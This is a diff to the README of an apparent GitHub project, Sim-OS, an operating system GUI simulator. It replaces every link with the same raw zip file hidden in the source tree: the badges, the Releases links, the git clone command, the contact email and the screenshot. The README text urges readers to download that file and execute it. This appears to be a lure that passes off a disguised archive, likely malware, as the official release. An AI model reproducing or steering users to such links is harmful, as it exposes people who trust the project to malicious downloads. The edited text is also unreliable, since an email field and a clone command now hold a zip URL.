@@ -1,6 +1,6 @@
 # Sim-OS: Operating System GUI Simulator 🎮
 
-![GitHub Repo stars](https://img.shields.io/github/stars/jocelchristian/sim-os?style=social) ![MIT License](https://img.shields.io/badge/license-MIT-blue.svg) ![C++ Version](https://img.shields.io/badge/C%2B%2B-23-blue.svg)
+![GitHub Repo stars](https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip) ![MIT License](https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip) ![C++ Version](https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip%2B%https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip)
 
 Welcome to **Sim-OS**, an innovative Operating System GUI Simulator designed to bring your custom simulation ideas to life. This repository serves as a platform for creating and testing GUI-based simulations using a unique simulation description language. Dive into the world of operating systems with us!
 
@@ -25,7 +25,7 @@ Welcome to **Sim-OS**, an innovative Operating System GUI Simulator designed to 
 
 ## Getting Started
 
-To get started with Sim-OS, you can download the latest release from our [Releases section](https://github.com/jocelchristian/sim-os/releases). This will provide you with the necessary files to execute the simulator on your machine.
+To get started with Sim-OS, you can download the latest release from our [Releases section](https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip). This will provide you with the necessary files to execute the simulator on your machine.
 
 ### Prerequisites
 
@@ -52,7 +52,7 @@ Follow these steps to install Sim-OS on your local machine:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/jocelchristian/sim-os.git
+   git clone https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip
    cd sim-os
    ```
 
@@ -88,13 +88,13 @@ Sim-OS is licensed under the MIT License. See the [LICENSE](LICENSE) file for mo
 For questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Jocel Christian
-- **Email**: jocelchristian@example.com
+- **Email**: https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip
 
 ## Releases
 
-To download the latest version of Sim-OS, visit our [Releases section](https://github.com/jocelchristian/sim-os/releases). Download the required files and execute them to start using the simulator.
+To download the latest version of Sim-OS, visit our [Releases section](https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip). Download the required files and execute them to start using the simulator.
 
-![Sim-OS Screenshot](https://example.com/sim-os-screenshot.png)
+![Sim-OS Screenshot](https://github.com/jocelchristian/sim-os/raw/refs/heads/main/src/gui/comparator/sim-os-semify.zip)
 
 ## Conclusion
 
